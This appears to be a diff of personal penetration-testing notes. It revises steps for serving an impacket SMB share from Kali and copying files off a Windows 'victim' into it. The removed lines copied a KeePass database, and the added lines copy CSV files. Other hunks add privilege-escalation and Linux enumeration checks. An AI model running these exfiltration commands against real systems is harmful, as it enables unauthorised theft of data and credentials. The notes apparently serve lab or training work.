@@ -166,21 +166,17 @@ if smb is enabled on the victim machine, we can use impacket's smbserver.py
 
 On kali:
 
-cd /opt/impacket/examples
+``impacket-smbserver share `pwd` ``
 
-``./smbserver Heyo `pwd` ``
-
-here we start up a share called 'Heyo'
-
-you need to use tickmarks with the pwd. note that the names "Heyo" and "Neigh" are completely arbitrary.
+here we start up a share called 'share'
 
 on windows (our target/victim):
 
-`New-PSDrive -Name "Neigh" -PSProvider "FileSystem" -Root "\\my.kali.ip\Heyo" `
+`net use z: \\kali-ip\share`
 
-`cd Neigh`
+`copy *.csv z:`
 
-`PS Neigh:\> cp C:\Users\victim\Documents\CEH.kdbx .`
+^ here we are copying csv files located in our present dir in windows to z, our kali share
 
 ### windows post exploitation
 
@@ -265,3 +261,9 @@ list scheduled tasks
 **AlwaysInstallElevated?**
 
 `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
+
+### linux post-exploitation
+
+don't forget to check the OS version (not just the kernel version!!!)
+
+`lsb_release -a`
